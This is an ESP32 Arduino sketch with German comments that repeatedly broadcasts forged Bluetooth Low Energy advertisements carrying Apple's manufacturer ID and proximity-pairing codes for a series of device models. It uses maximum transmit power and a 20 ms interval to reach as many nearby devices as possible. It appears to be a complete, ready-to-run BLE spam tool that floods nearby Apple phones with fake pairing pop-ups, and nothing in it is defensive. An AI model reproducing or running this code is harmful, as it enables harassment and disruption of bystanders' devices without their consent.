#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

BLEAdvertising *pAdvertising;

uint8_t devices[][2] = {
  {0x02, 0x01}, {0x0f, 0x19}, {0x13, 0x19},
  {0x05, 0x19}, {0x0b, 0x19}, {0x07, 0x19},
  {0x14, 0x19}, {0x03, 0x19}, {0x0c, 0x19}
};

void setup() {
  Serial.begin(115200);
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising(); 
  
  // Maximale Power
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
}

void loop() {
  for (int i = 0; i < 9; i++) {
    uint8_t packet[31];
    packet[0] = 0x1e;
    packet[1] = 0xff;
    packet[2] = 0x4c;
    packet[3] = 0x00;
    packet[4] = 0x07;
    packet[5] = 0x19;
    packet[6] = 0x07;
    packet[7] = 0x02;
    packet[8] = 0x20;
    packet[9] = devices[i][0];
    packet[10] = devices[i][1];

    for(int j = 11; j < 31; j++) {
      packet[j] = (uint8_t)esp_random();
    }

    BLEAdvertisementData oData;
    oData.addData((char*)packet, 31);
    
    pAdvertising->setAdvertisementData(oData);
    
    // Reichweiten-Boost: Extrem schnelles Senden
    pAdvertising->setMinInterval(0x20); // 20ms
    pAdvertising->setMaxInterval(0x20); // 20ms
    
    pAdvertising->start();
    delay(100); // Länger senden erhöht die Chance, dass Geräte es auffangen
    pAdvertising->stop();
    delay(5);
  }
}
